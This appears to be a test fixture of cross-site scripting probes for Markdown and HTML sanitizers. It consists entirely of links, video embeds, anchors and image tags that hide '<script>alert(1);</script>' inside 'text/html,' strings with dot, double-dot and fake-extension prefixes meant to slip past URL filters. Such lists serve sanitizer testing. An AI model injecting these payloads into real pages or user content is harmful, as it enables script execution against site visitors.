javascript
[11](.alert(1);)

[XSS](./..alert(1);)

[XSS](.\alert(1);)

# VIDEO (Markdown)
![VIDEO-src-Hierarchical](.text/html,<script>alert(1);</script>fake.mp4)

![VIDEO-src-Hierarchical-DoubleDot](..text/html,<script>alert(1);</script>fake.mp4)

![VIDEO-src-Hierarchical-DotSlashDotDotSlash](./../text/html,<script>alert(1);</script>fake.mp4)

![VIDEO-src-Extname](text/html,<script>alert(1);</script>fake.mp4)

# HTML A href (Markup)
<a href=".text/html,<script>alert(1);</script>">MARKUP-A-href-Hierarchical-Dot</a>

<a href="..text/html,<script>alert(1);</script>">MARKUP-A-href-Hierarchical-DotDot</a>

<a href="./../text/html,<script>alert(1);</script>">MARKUP-A-href-Hierarchical-DotSlashDotDotSlash</a>

<a href="text/html,<script>alert(1);</script>fake.text">MARKUP-A-href-Extname</a>

# HTML IMG (Markup)
<img src=".text/html,<script>alert(1);</script>" alt="MARKUP-IMG-src-Hierarchical-Dot"></img>

<img src="..text/html,<script>alert(1);</script>" alt="MARKUP-IMG-src-Hierarchical-DotDot"></img>

<img src="./../text/html,<script>alert(1);</script>" alt="MARKUP-IMG-src-Hierarchical-DotSlashDotDotSlash"></img>

<img src="text/html,<script>alert(1);</script>fake.text" alt="MARKUP-IMG-src-Extname"></img>
